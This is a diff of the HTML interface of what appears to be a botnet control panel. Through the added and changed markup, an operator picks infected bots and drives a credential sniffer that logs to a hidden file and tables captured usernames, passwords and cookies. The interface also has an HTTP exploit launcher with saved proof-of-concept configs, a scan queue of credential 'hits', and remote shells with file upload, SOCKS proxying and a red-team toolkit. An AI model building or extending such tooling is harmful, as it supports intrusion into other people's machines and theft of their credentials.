-                            <pre id="hexpl-preview" style="display:none;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;font-family:var(--mono);font-size:11px;color:var(--cyan);max-height:200px;overflow:auto;white-space:pre-wrap;word-break:break-all"></pre>
+                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px;cursor:pointer"
+                                onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='none'?'block':'none'">
+                                &#9654; Payload Preview</div>
+                            <pre id="hexpl-preview"
+                                style="display:none;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;font-family:var(--mono);font-size:11px;color:var(--cyan);max-height:200px;overflow:auto;white-space:pre-wrap;word-break:break-all"></pre>
                         </div>
                     </div>
                     <div class="scanner-card-actions" style="flex-wrap:wrap">
-                        <button class="ms-btn" onclick="httpExplStart()" style="background:var(--accent);color:#fff;font-size:12px;font-weight:700;padding:6px 18px;border-radius:6px">Start</button>
-                        <button class="ms-btn" onclick="httpExplStop()" style="background:var(--red);color:#fff;font-size:12px;font-weight:700;padding:6px 18px;border-radius:6px">Stop</button>
+                        <button class="ms-btn" onclick="httpExplStart()"
+                            style="background:var(--accent);color:#fff;font-size:12px;font-weight:700;padding:6px 18px;border-radius:6px">Start</button>
+                        <button class="ms-btn" onclick="httpExplStop()"
+                            style="background:var(--red);color:#fff;font-size:12px;font-weight:700;padding:6px 18px;border-radius:6px">Stop</button>
                         <span style="border-left:1px solid var(--border);margin:0 4px"></span>
-                        <select id="hexpl-poc-select" style="background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:5px 8px;font-size:11px;max-width:160px">
+                        <select id="hexpl-poc-select"
+                            style="background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:5px 8px;font-size:11px;max-width:160px">
                             <option value="">-- PoC Configs --</option>
                         </select>
-                        <button class="ms-btn" onclick="hexplLoadPoc()" style="font-size:11px;padding:5px 10px">Load</button>
-                        <button class="ms-btn" onclick="hexplSavePoc()" style="font-size:11px;padding:5px 10px;color:var(--green)">Save</button>
-                        <button class="ms-btn" onclick="hexplDeletePoc()" style="font-size:11px;padding:5px 10px;color:var(--red)">Del</button>
+                        <button class="ms-btn" onclick="hexplLoadPoc()"
+                            style="font-size:11px;padding:5px 10px">Load</button>
+                        <button class="ms-btn" onclick="hexplSavePoc()"
+                            style="font-size:11px;padding:5px 10px;color:var(--green)">Save</button>
+                        <button class="ms-btn" onclick="hexplDeletePoc()"
+                            style="font-size:11px;padding:5px 10px;color:var(--red)">Del</button>
                     </div>
                     <div style="padding:8px 16px 14px">
                         <div id="hexpl-hits-wrap" style="max-height:300px;overflow-y:auto"></div>
                         <div style="display:flex;gap:8px;margin-top:8px">
-                            <button class="ms-btn" onclick="httpExplClearHits()" style="font-size:12px;opacity:0.6">Clear Hits</button>
+                            <button class="ms-btn" onclick="httpExplClearHits()"
+                                style="font-size:12px;opacity:0.6">Clear Hits</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab: Sniffer -->
+        <div class="tab-panel" id="tab-sniffer">
+            <div class="scanner-card" style="max-width:720px">
+                <div class="scanner-card-header">
+                    <span class="scanner-card-title">Network Sniffer</span>
+                    <span class="scanner-card-desc">Passive HTTP credential capture — runs per-bot, logs locally. Stats
+                        stream back every ~70s.</span>
+                </div>
+                <div class="scanner-card-body">
+                    <div style="display:flex;gap:12px;align-items:end;margin-bottom:16px;flex-wrap:wrap">
+                        <div style="flex:1;min-width:200px">
+                            <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Bot</div>
+                            <select id="sniff-bot"
+                                style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px 10px;font-size:12px;font-family:var(--mono)">
+                                <option value="">Select a bot...</option>
+                            </select>
+                        </div>
+                        <div style="flex:1;min-width:200px">
+                            <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Log Path (on bot)</div>
+                            <input type="text" id="sniff-logpath" value="/tmp/.sniff.log"
+                                style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px 10px;font-size:12px;font-family:var(--mono)">
+                        </div>
+                    </div>
+                    <div style="display:flex;gap:8px;align-items:center;margin-bottom:16px">
+                        <button class="ms-btn" onclick="snifferStart()"
+                            style="background:var(--accent);color:#fff;font-weight:700;padding:6px 18px;border-radius:6px">Start</button>
+                        <button class="ms-btn" onclick="snifferStop()"
+                            style="background:var(--red);color:#fff;font-weight:700;padding:6px 18px;border-radius:6px">Stop</button>
+                        <button class="ms-btn" onclick="snifferDownloadLog()" style="font-size:12px">Download
+                            Log</button>
+                        <span id="sniff-status" style="margin-left:8px;font-size:13px;color:var(--text-dim)"></span>
+                    </div>
+                    <!-- Live stats counters -->
+                    <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:12px">
+                        <div
+                            style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center">
+                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">POST Creds</div>
+                            <div style="font-size:22px;font-weight:700;color:var(--green)" id="sniff-cnt-post">0</div>
+                        </div>
+                        <div
+                            style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center">
+                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">Basic Auth</div>
+                            <div style="font-size:22px;font-weight:700;color:var(--cyan)" id="sniff-cnt-basic">0</div>
+                        </div>
+                        <div
+                            style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center">
+                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">Cookies</div>
+                            <div style="font-size:22px;font-weight:700;color:var(--orange,#f0883e)"
+                                id="sniff-cnt-cookie">0</div>
+                        </div>
+                        <div
+                            style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center">
+                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">URL Creds</div>
+                            <div style="font-size:22px;font-weight:700;color:var(--purple,#a371f7)" id="sniff-cnt-url">0
+                            </div>
+                        </div>
+                        <div
+                            style="background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center">
+                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px">Total</div>
+                            <div style="font-size:22px;font-weight:700;color:var(--text)" id="sniff-cnt-total">0</div>
+                        </div>
+                    </div>
+                    <!-- Per-bot status log -->
+                    <div id="sniff-log"
+                        style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;max-height:200px;overflow-y:auto;font-family:var(--mono);font-size:11px;color:var(--text-dim)">
+                    </div>
+                    <!-- Sniff Hits Table -->
+                    <div style="margin-top:16px">
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+                            <span style="font-weight:700;font-size:14px;color:var(--text)">Captured Credentials</span>
+                            <div style="display:flex;gap:6px">
+                                <button class="ms-btn" onclick="sniffRefreshHits()"
+                                    style="font-size:11px;padding:4px 10px">Refresh</button>
+                                <button class="ms-btn" onclick="sniffExportCSV()"
+                                    style="font-size:11px;padding:4px 10px">CSV</button>
+                                <button class="ms-btn" onclick="sniffExportTxt()"
+                                    style="font-size:11px;padding:4px 10px">TXT</button>
+                                <button class="ms-btn" onclick="sniffClearHits()"
+                                    style="font-size:11px;padding:4px 10px;color:var(--red)">Clear</button>
+                            </div>
+                        </div>
+                        <div style="max-height:320px;overflow-y:auto;border:1px solid var(--border);border-radius:6px">
+                            <table class="ms-table" style="width:100%;font-size:12px">
+                                <thead>
+                                    <tr>
+                                        <th>Type</th>
+                                        <th>IP</th>
+                                        <th>User</th>
+                                        <th>Pass</th>
+                                        <th>Bot</th>
+                                        <th>Time</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="sniff-hits-tbody"></tbody>
+                            </table>
                         </div>
                     </div>
                 </div>
@@ -824,63 +998,93 @@
         <!-- Tab: Results -->
         <div class="tab-panel" id="tab-results">
             <!-- Job Progress -->
-            <div id="scan-job-panel" style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px;margin-bottom:16px">
+            <div id="scan-job-panel"
+                style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px;margin-bottom:16px">
                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
                     <div>
                         <span style="font-weight:700;color:var(--text);font-size:16px" id="sjob-title">Scan Queue</span>
-                        <span style="font-size:12px;color:var(--text-dim);margin-left:10px" id="sjob-status">No active job</span>
+                        <span style="font-size:12px;color:var(--text-dim);margin-left:10px" id="sjob-status">No active
+                            job</span>
                     </div>
                     <div style="display:flex;gap:8px">
-                        <button class="ms-btn" id="sjob-btn-pause" onclick="scanJobStop()" style="color:var(--red);font-size:12px;padding:6px 14px" title="Pause queue — bots finish current batch">Pause</button>
-                        <button class="ms-btn" id="sjob-btn-force-stop" onclick="scanJobForceStop()" style="color:var(--red);font-size:12px;padding:6px 14px;display:none" title="Kill all scanners immediately">Force Stop</button>
-                        <button class="ms-btn" id="sjob-btn-resume" onclick="scanJobResume()" style="color:var(--green);font-size:12px;padding:6px 14px;display:none">Resume</button>
-                        <button class="ms-btn" onclick="scanJobExportHits()" style="color:var(--green);font-size:12px;padding:6px 14px">Export CSV</button>
-                        <button class="ms-btn" onclick="scanJobClear()" style="opacity:0.6;font-size:12px;padding:6px 14px">Clear</button>
+                        <button class="ms-btn" id="sjob-btn-pause" onclick="scanJobStop()"
+                            style="color:var(--red);font-size:12px;padding:6px 14px"
+                            title="Pause queue — bots finish current batch">Pause</button>
+                        <button class="ms-btn" id="sjob-btn-force-stop" onclick="scanJobForceStop()"
+                            style="color:var(--red);font-size:12px;padding:6px 14px;display:none"
+                            title="Kill all scanners immediately">Force Stop</button>
+                        <button class="ms-btn" id="sjob-btn-resume" onclick="scanJobResume()"
+                            style="color:var(--green);font-size:12px;padding:6px 14px;display:none">Resume</button>
+                        <button class="ms-btn" onclick="scanJobExportHits()"
+                            style="color:var(--green);font-size:12px;padding:6px 14px">Export CSV</button>
+                        <button class="ms-btn" onclick="scanJobClear()"
+                            style="opacity:0.6;font-size:12px;padding:6px 14px">Clear</button>
                     </div>
                 </div>
                 <!-- Progress bar -->
-                <div style="background:var(--bg-input);border-radius:8px;height:28px;overflow:hidden;position:relative;margin-bottom:10px">
-                    <div id="sjob-bar-hits" style="position:absolute;left:0;top:0;height:100%;background:var(--green);transition:width .3s"></div>
-                    <div id="sjob-bar-miss" style="position:absolute;top:0;height:100%;background:var(--text-dim);opacity:0.4;transition:left .3s,width .3s"></div>
-                    <div id="sjob-bar-err" style="position:absolute;top:0;height:100%;background:var(--red);opacity:0.5;transition:left .3s,width .3s"></div>
-                    <span id="sjob-bar-text" style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);font-size:12px;font-weight:700;color:#fff;text-shadow:0 1px 2px rgba(0,0,0,.5)">0/0</span>
+                <div
+                    style="background:var(--bg-input);border-radius:8px;height:28px;overflow:hidden;position:relative;margin-bottom:10px">
+                    <div id="sjob-bar-hits"
+                        style="position:absolute;left:0;top:0;height:100%;background:var(--green);transition:width .3s">
+                    </div>
+                    <div id="sjob-bar-miss"
+                        style="position:absolute;top:0;height:100%;background:var(--text-dim);opacity:0.4;transition:left .3s,width .3s">
+                    </div>
+                    <div id="sjob-bar-err"
+                        style="position:absolute;top:0;height:100%;background:var(--red);opacity:0.5;transition:left .3s,width .3s">
+                    </div>
+                    <span id="sjob-bar-text"
+                        style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);font-size:12px;font-weight:700;color:#fff;text-shadow:0 1px 2px rgba(0,0,0,.5)">0/0</span>
                 </div>
                 <!-- Stats -->
                 <div style="display:flex;gap:16px;flex-wrap:wrap;font-size:13px">
                     <span style="color:var(--text-dim)">Total: <b id="sjob-total" style="color:var(--text)">0</b></span>
-                    <span style="color:var(--text-dim)">Pending: <b id="sjob-pending" style="color:var(--blue)">0</b></span>
-                    <span style="color:var(--text-dim)">Assigned: <b id="sjob-assigned" style="color:var(--yellow, #e2b93d)">0</b></span>
+                    <span style="color:var(--text-dim)">Pending: <b id="sjob-pending"
+                            style="color:var(--blue)">0</b></span>
+                    <span style="color:var(--text-dim)">Assigned: <b id="sjob-assigned"
+                            style="color:var(--yellow, #e2b93d)">0</b></span>
                     <span style="color:var(--text-dim)">Hits: <b id="sjob-hits" style="color:var(--green)">0</b></span>
-                    <span style="color:var(--text-dim)">Misses: <b id="sjob-miss" style="color:var(--text-muted)">0</b></span>
+                    <span style="color:var(--text-dim)">Misses: <b id="sjob-miss"
+                            style="color:var(--text-muted)">0</b></span>
                     <span style="color:var(--text-dim)">Errors: <b id="sjob-err" style="color:var(--red)">0</b></span>
                 </div>
             </div>
             <!-- Two-column: Hits table + Live feed -->
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
                 <!-- Hits Table -->
-                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">
-                    <div style="padding:10px 16px;border-bottom:1px solid var(--border);background:var(--bg-elevated);display:flex;align-items:center;gap:8px">
+                <div
+                    style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">
+                    <div
+                        style="padding:10px 16px;border-bottom:1px solid var(--border);background:var(--bg-elevated);display:flex;align-items:center;gap:8px">
                         <span style="font-weight:700;color:var(--text);font-size:14px">Hits</span>
-                        <span id="sjob-hits-badge" style="background:var(--green);color:#fff;padding:1px 8px;border-radius:10px;font-size:11px;font-weight:700">0</span>
-                        <input type="text" id="sjob-hits-search" placeholder="Filter by IP or cred..." oninput="scanJobFilterHits()" style="flex:1;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:4px 8px;font-size:11px;font-family:var(--mono);min-width:100px">
-                        <button onclick="scanJobCopyAllHits()" class="ms-btn" style="font-size:10px;padding:3px 8px;color:var(--cyan)">Copy All</button>
+                        <span id="sjob-hits-badge"
+                            style="background:var(--green);color:#fff;padding:1px 8px;border-radius:10px;font-size:11px;font-weight:700">0</span>
+                        <input type="text" id="sjob-hits-search" placeholder="Filter by IP or cred..."
+                            oninput="scanJobFilterHits()"
+                            style="flex:1;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:4px 8px;font-size:11px;font-family:var(--mono);min-width:100px">
+                        <button onclick="scanJobCopyAllHits()" class="ms-btn"
+                            style="font-size:10px;padding:3px 8px;color:var(--cyan)">Copy All</button>
                     </div>
                     <div id="sjob-hits-table" style="max-height:500px;overflow-y:auto;padding:0">
-                        <div style="color:var(--text-dim);font-size:12px;padding:20px;text-align:center">No hits yet</div>
+                        <div style="color:var(--text-dim);font-size:12px;padding:20px;text-align:center">No hits yet
+                        </div>
                     </div>
                 </div>
                 <!-- Live Feed -->
-                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">
+                <div
+                    style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">
                     <div style="padding:10px 16px;border-bottom:1px solid var(--border);background:var(--bg-elevated)">
                         <span style="font-weight:700;color:var(--text);font-size:14px">Live Feed</span>
                     </div>
-                    <div id="sjob-hits-feed" style="max-height:500px;overflow-y:auto;padding:8px;font-family:var(--mono);font-size:12px">
+                    <div id="sjob-hits-feed"
+                        style="max-height:500px;overflow-y:auto;padding:8px;font-family:var(--mono);font-size:12px">
                         <div style="color:var(--text-dim);padding:12px;text-align:center">Waiting for results...</div>
                     </div>
                 </div>
             </div>
             <!-- Bot Scan Performance -->
-            <div id="sjob-bot-stats" style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden;margin-top:16px;display:none">
+            <div id="sjob-bot-stats"
+                style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden;margin-top:16px;display:none">
                 <div style="padding:10px 16px;border-bottom:1px solid var(--border);background:var(--bg-elevated)">
                     <span style="font-weight:700;color:var(--text);font-size:14px">Bot Performance</span>
                 </div>
@@ -948,18 +1152,35 @@
                     <span class="title" id="shell-title">Shell</span>
                     <div class="meta" id="shell-meta"></div>
                 </div>
-                <div style="display:flex;gap:6px;align-items:center">
+                <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">
                     <!-- Shell tab bar for multi-shell -->
                     <div class="shell-tabs" id="shell-tabs"></div>
                     <!-- Split view buttons -->
                     <div class="shell-layout-btns">
-                        <button class="layout-btn active" onclick="setShellLayout('single')" title="Single pane">&#9634;</button>
-                        <button class="layout-btn" onclick="setShellLayout('split-h')" title="Split horizontal">&#9635;</button>
-                        <button class="layout-btn" onclick="setShellLayout('split-v')" title="Split vertical">&#9636;</button>
+                        <button class="layout-btn active" onclick="setShellLayout('single')"
+                            title="Single pane">&#9634;</button>
+                        <button class="layout-btn" onclick="setShellLayout('split-h')"
+                            title="Split horizontal">&#9635;</button>
+                        <button class="layout-btn" onclick="setShellLayout('split-v')"
+                            title="Split vertical">&#9636;</button>
                         <button class="layout-btn" onclick="setShellLayout('quad')" title="Quad view">&#9638;</button>
                     </div>
                     <!-- Theme picker -->
-                    <select id="shell-theme-picker" onchange="applyShellTheme(this.value)" title="Terminal theme" style="background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-size:12px;cursor:pointer"></select>
+                    <select id="shell-theme-picker" onchange="applyShellTheme(this.value)" title="Terminal theme"
+                        style="background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-size:12px;cursor:pointer"></select>
+                    <!-- Font zoom -->
+                    <div style="display:flex;gap:2px">
+                        <button class="layout-btn" onclick="shellZoom(-1)" title="Zoom out (Ctrl+-)">A&#8315;</button>
+                        <button class="layout-btn" onclick="shellZoom(1)" title="Zoom in (Ctrl+=)">A&#8314;</button>
+                    </div>
+                    <!-- PTY toggle -->
+                    <button class="layout-btn" id="pty-toggle-btn" onclick="togglePtyMode()"
+                        title="Toggle PTY mode (full interactive terminal)">PTY</button>
+                    <button class="layout-btn" id="pty-default-btn" onclick="togglePtyDefault()"
+                        title="Start in PTY mode by default">PTY&#8599;</button>
+                    <!-- Maximize -->
+                    <button class="layout-btn" id="shell-max-btn" onclick="toggleShellMaximize()"
+                        title="Maximize / Restore">&#x26F6;</button>
                     <button class="close-btn" onclick="closeShell()">&times;</button>
                 </div>
             </div>
@@ -982,34 +1203,66 @@
                             <div class="sidebar-header">
                                 <span>Files</span>
                                 <span>
-                                    <button class="sidebar-refresh" onclick="refreshFiles()" title="Refresh">&#8635;</button>
-                                    <button class="sidebar-refresh" onclick="toggleFileSidebar()" title="Collapse">&laquo;</button>
+                                    <button class="sidebar-refresh" onclick="refreshFiles()"
+                                        title="Refresh">&#8635;</button>
+                                    <button class="sidebar-refresh" onclick="toggleFileSidebar()"
+                                        title="Collapse">&laquo;</button>
                                 </span>
+                            </div>
+                            <div class="fb-path-row">
+                                <input id="fb-path-input" class="fb-path-input" placeholder="/path/to/dir"
+                                    autocomplete="off" spellcheck="false"
+                                    onkeydown="if(event.key==='Enter')shellGotoPath(this.value)">
+                                <button class="fb-path-go"
+                                    onclick="shellGotoPath(document.getElementById('fb-path-input').value)"
+                                    title="Go">&#10132;</button>
                             </div>
                             <div class="file-list" id="file-list">
                                 <div class="file-empty">Send a command to populate</div>
                             </div>
                         </div>
                         <!-- Terminal area -->
-                        <button class="sidebar-expand-btn" id="sidebar-expand-btn" onclick="toggleFileSidebar()" title="Show files" style="display:none">&raquo;</button>
+                        <button class="sidebar-expand-btn" id="sidebar-expand-btn" onclick="toggleFileSidebar()"
+                            title="Show files" style="display:none">&raquo;</button>
                         <div class="shell-terminal">
                             <div class="shell-output" id="shell-output"></div>
-                            <div class="shell-input-row">
+                            <div id="pty-terminal" style="display:none;width:100%;height:100%"></div>
+                            <div class="shell-input-row" id="shell-input-row">>
+                                <span class="shell-stream-indicator" id="shell-stream-indicator" style="display:none"
+                                    title="Command running..."></span>
                                 <span class="prompt" id="shell-prompt">~$</span>
-                                <input type="text" id="shell-input" placeholder="Type a command... (Tab for autocomplete)"
-                                    autocomplete="off" spellcheck="false">
+                                <input type="text" id="shell-input"
+                                    placeholder="Type a command... (Tab for autocomplete)" autocomplete="off"
+                                    spellcheck="false">
+                                <button class="shell-ctrlc-btn" id="shell-ctrlc-btn" onclick="shellCtrlC()"
+                                    title="Ctrl+C — clear input / abort">&#9647; ^C</button>
                                 <div class="tab-complete" id="tab-complete" style="display:none"></div>
                             </div>
                         </div>
-                        <!-- Bot info sidebar -->
+                        <!-- Bot info + history sidebar -->
                         <div class="shell-info-sidebar" id="shell-info-sidebar">
-                            <div class="sidebar-header"><span>Bot Info</span></div>
+                            <div class="isb-tabs">
+                                <span class="isb-tab isb-tab-active" id="isb-tab-info"
+                                    onclick="switchSidebarTab(0)">Info</span>
+                                <span class="isb-tab" id="isb-tab-hist" onclick="switchSidebarTab(1)">History</span>
+                            </div>
                             <div class="info-sidebar-body" id="info-sidebar-body"></div>
+                            <div id="info-sidebar-hist"
+                                style="display:none;flex:1;overflow:hidden;flex-direction:column">
+                                <div style="padding:6px 8px;border-bottom:1px solid var(--border)">
+                                    <input id="hist-search" oninput="renderHistoryPanel()"
+                                        placeholder="Search history..."
+                                        style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:4px 6px;font-size:11px;font-family:var(--mono)">
+                                </div>
+                                <div id="hist-list" style="flex:1;overflow-y:auto"></div>
+                            </div>
                         </div>
                     </div>
                 </div>
             </div>
             <div class="shell-actions">
+                <button class="shell-action-btn" onclick="shellPtyPaste()"
+                    title="Paste clipboard into PTY (Ctrl+V also works)">Paste &#128203;</button>
                 <button class="shell-action-btn" onclick="shellUploadFile()"
                     title="Upload file to bot (writes to /tmp/)">Upload</button>
                 <button class="shell-action-btn" onclick="saveShellHistory()"
@@ -1017,8 +1270,15 @@
                 <button class="shell-action-btn" onclick="copyShellOutput()" title="Copy output to clipboard">Copy
                     Output</button>
                 <div class="shell-toolkit-wrap" id="shell-toolkit-wrap">
-                    <button class="shell-action-btn" onclick="toggleToolkit()" title="Red team helpers">Toolkit &#9662;</button>
-                    <div class="shell-toolkit-menu" id="shell-toolkit-menu"></div>
+                    <button class="shell-action-btn" onclick="toggleToolkit()" title="Red team helpers">Toolkit
+                        &#9662;</button>
+                    <div class="shell-toolkit-menu" id="shell-toolkit-menu">
+                        <div class="toolkit-search-row">
+                            <input id="toolkit-search" class="toolkit-search-input" placeholder="Search commands..."
+                                oninput="buildToolkitMenu()" autocomplete="off">
+                        </div>
+                        <div id="toolkit-grid-body"></div>
+                    </div>
                 </div>
                 <button class="shell-action-btn" style="color:var(--accent);border-color:var(--accent)"
                     onclick="shellStartSocks()" title="Start SOCKS proxy">SOCKS</button>
@@ -1028,9 +1288,10 @@
             <!-- Broadcast bar for multi-pane mode -->
             <div class="shell-broadcast" id="shell-broadcast" style="display:none">
                 <span class="broadcast-label">Broadcast:</span>
-                <input type="text" id="shell-broadcast-input" placeholder="Send to all panes..." autocomplete="off" spellcheck="false"
-                    onkeydown="if(event.key==='Enter')broadcastShellCmd(this.value)">
+                <input type="text" id="shell-broadcast-input" placeholder="Send to all panes..." autocomplete="off"
+                    spellcheck="false" onkeydown="if(event.key==='Enter')broadcastShellCmd(this.value)">
             </div>
+            <div id="shell-resize-handle" class="shell-resize-handle"></div>
         </div>
     </div>
 
@@ -1078,6 +1339,7 @@
         </div>
     </div>
 
+    <div class="bot-drawer-backdrop" id="bot-drawer-backdrop" onclick="closeDrawer()"></div>
     <!-- Bot Detail Drawer -->
     <div class="bot-drawer" id="bot-drawer">
         <div class="bot-drawer-header">
@@ -1087,24 +1349,36 @@
         <div class="bot-drawer-body">
             <div class="drawer-section">
                 <h4>Identity</h4>
-                <div class="drawer-row"><span class="drawer-label">Bot ID</span><span class="drawer-val" id="dr-botid"></span></div>
-                <div class="drawer-row"><span class="drawer-label">IP</span><span class="drawer-val" id="dr-ip"></span></div>
-                <div class="drawer-row"><span class="drawer-label">Country</span><span class="drawer-val" id="dr-country"></span></div>
-                <div class="drawer-row"><span class="drawer-label">Origin</span><span class="drawer-val" id="dr-origin"></span></div>
-                <div class="drawer-row"><span class="drawer-label">Group</span><span class="drawer-val" id="dr-group"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Bot ID</span><span class="drawer-val"
+                        id="dr-botid"></span></div>
+                <div class="drawer-row"><span class="drawer-label">IP</span><span class="drawer-val" id="dr-ip"></span>
+                </div>
+                <div class="drawer-row"><span class="drawer-label">Country</span><span class="drawer-val"
+                        id="dr-country"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Origin</span><span class="drawer-val"
+                        id="dr-origin"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Group</span><span class="drawer-val"
+                        id="dr-group"></span></div>
             </div>
             <div class="drawer-section">
                 <h4>Hardware</h4>
-                <div class="drawer-row"><span class="drawer-label">Architecture</span><span class="drawer-val" id="dr-arch"></span></div>
-                <div class="drawer-row"><span class="drawer-label">RAM</span><span class="drawer-val" id="dr-ram"></span></div>
-                <div class="drawer-row"><span class="drawer-label">CPU</span><span class="drawer-val" id="dr-cpu"></span></div>
-                <div class="drawer-row"><span class="drawer-label">Process</span><span class="drawer-val" id="dr-proc"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Architecture</span><span class="drawer-val"
+                        id="dr-arch"></span></div>
+                <div class="drawer-row"><span class="drawer-label">RAM</span><span class="drawer-val"
+                        id="dr-ram"></span></div>
+                <div class="drawer-row"><span class="drawer-label">CPU</span><span class="drawer-val"
+                        id="dr-cpu"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Process</span><span class="drawer-val"
+                        id="dr-proc"></span></div>
             </div>
             <div class="drawer-section">
                 <h4>Status</h4>
-                <div class="drawer-row"><span class="drawer-label">Uptime</span><span class="drawer-val" id="dr-uptime"></span></div>
-                <div class="drawer-row"><span class="drawer-label">Last Ping</span><span class="drawer-val" id="dr-ping"></span></div>
-                <div class="drawer-row"><span class="drawer-label">SOCKS</span><span class="drawer-val" id="dr-socks"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Uptime</span><span class="drawer-val"
+                        id="dr-uptime"></span></div>
+                <div class="drawer-row"><span class="drawer-label">Last Ping</span><span class="drawer-val"
+                        id="dr-ping"></span></div>
+                <div class="drawer-row"><span class="drawer-label">SOCKS</span><span class="drawer-val"
+                        id="dr-socks"></span></div>
             </div>
             <div class="drawer-section">
                 <h4>Actions</h4>
@@ -1113,6 +1387,21 @@
         </div>
     </div>
 
+    <!-- File browser context menu -->
+    <div id="file-ctx-menu" class="file-ctx-menu" style="display:none">
+        <div class="ctx-item" onclick="ctxCopyPath()">&#128203; Copy Path</div>
+        <div class="ctx-item" id="ctx-cd-item" onclick="ctxCd()">&#128193; Open / Cd Here</div>
+        <div class="ctx-item" id="ctx-pty-item" onclick="ctxOpenPty()">&#128421; Open in PTY</div>
+        <div class="ctx-item" id="ctx-cat-item" onclick="ctxCat()">&#128065; View (cat)</div>
+        <div class="ctx-item" id="ctx-dl-item" onclick="ctxDownload()">&#8681; Download</div>
+        <div class="ctx-divider"></div>
+        <div class="ctx-item" id="ctx-chmod-item" onclick="ctxChmod()">&#128295; chmod +x</div>
+        <div class="ctx-item ctx-danger" onclick="ctxDelete()">&#128465; Delete</div>
+        <div class="ctx-item" onclick="ctxRename()">&#9998; Rename</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/lib/xterm.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@xterm/addon-fit@0.10.0/lib/addon-fit.min.js"></script>
     <script src="/static/app.js"></script>
 </body>
 
